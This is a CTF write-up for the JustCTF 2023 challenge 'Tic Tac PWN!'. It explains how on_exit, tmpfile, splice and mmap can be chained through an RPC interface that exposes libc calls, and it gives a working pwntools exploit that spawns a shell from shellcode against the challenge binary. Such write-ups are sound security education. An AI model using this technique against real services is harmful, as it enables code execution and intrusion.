---
title: "[JustCTF-2023] Tic Tac PWN!"
date: 2023-05-31 20:56:00
tags: 
layout: post
---
# 0x00 Prologue
I didn't solve this challenge, this is an after game reproducing write-up.

The solution is from my teammates @in1t.

# 0x01 Challenge
- We are allowed to execute arbitrary libc functions (not starting with `_`)
- All parameters only have 4 bytes
- There is a check function to check if we have allocated memory less than 0x100000000. 

# 0x02 on_exit

Can we register more than one function by using `on_exit`?
I wrote a demo and got the answer: 

```c
#include <stdio.h>
int func1(){
    puts("1");
}
int func2(){
    puts("2");
}
int main(){
on_exit(func1);
on_exit(func2);
}
```
The result of the above code is `2\n1\n` which means we can register multiple functions and the execution order is "FILO".


# 0x03 Solution

Ideas:
- Even if we `exit` because of the function exit, we can still use `on_exit` to register a function before `_exit`
- so the last part of our exploit script should be `call(on_exit)+call(mmap)`
- Before creating the memory, we can't prepare our shellcode on it, but we can map a file to memory

Solution:
- call `tmpfile` to create an fd
- call `splice` to write our shellcode to the fd
- call `on_exit` to register a function before `_exit`
- call `mmap` to map the tmpfile to memory

# 0x04 Expoit
```py
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

p = process(["./rpc_server"], env={'LD_PRELOAD':'./rpc_tictactoe.so'})
ru      = lambda a:     p.readuntil(a)
def call(func,arg1=0,arg2=0,arg3=0,arg4=0,arg5=0,arg6=0):
    p.sendline(f'x:{func} '.encode())
    p.sendline(f'{arg1} {arg2} {arg3} {arg4} {arg5} {arg6}'.encode())
sh = asm(shellcraft.sh())
call("tmpfile")
ru("RPC\n")
call("splice",0,0,3,0,len(sh),0)
p.send(sh)
ru("RPC\n")
call("on_exit",0x10000,0)
ru("RPC\n")
call("mmap",0x10000,0x1000,7,0x1,3,0)
ru("RPC\n")
p.interactive()
```

# 0x05 Epilogue

I learned some interesting functions: `tmpfile`, `splice`, and `on_exit`.
All parameters of them are less than 4 bytes, we can use them when the registers are limited.


# 0x06 Reference
tmpfile: https://man7.org/linux/man-pages/man3/tmpfile.3.html

splice: https://man7.org/linux/man-pages/man2/splice.2.html

on_exit: https://man7.org/linux/man-pages/man3/on_exit.3.html

mmap: https://man7.org/linux/man-pages/man2/mmap.2.html
